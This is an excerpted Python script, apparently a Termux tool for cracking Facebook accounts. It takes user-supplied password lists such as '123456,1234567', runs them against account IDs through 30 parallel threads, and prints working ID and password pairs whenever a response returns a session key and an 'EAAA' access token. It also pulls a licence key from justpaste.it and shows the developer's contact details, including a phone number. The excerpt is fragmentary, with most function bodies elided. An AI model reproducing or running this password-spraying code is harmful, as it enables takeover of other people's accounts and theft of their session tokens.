...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/imran.termux.U"])
	exit(" [*] Youtube:  https://youtube.com/channel/UCrWbMaqJZcEM5NdICya96hA")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> Imran Hossain")
	subprocess.check_output(["am", "start", "https://www.facebook.com/imran.termux.U"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://justpaste.it/44564').text
			if basesplit in plr:
				key = basesplit
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            Imran Hossin
     \033[1;91m➣ \033[1;92mFACEBOOK   :            Imran Hossain 
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01647334345
     \033[1;96m➣ \033[1;92mGITHUB     :            IMRAN22X
...
#				exit()
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR IMRAN "%(Y,G,B,Y))
	...
	def old_9(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR IMRAN "%(Y,W,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:IMRAN ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[IMRAN-CP] %s|%s\033[0;97m         "%(uid, pw))
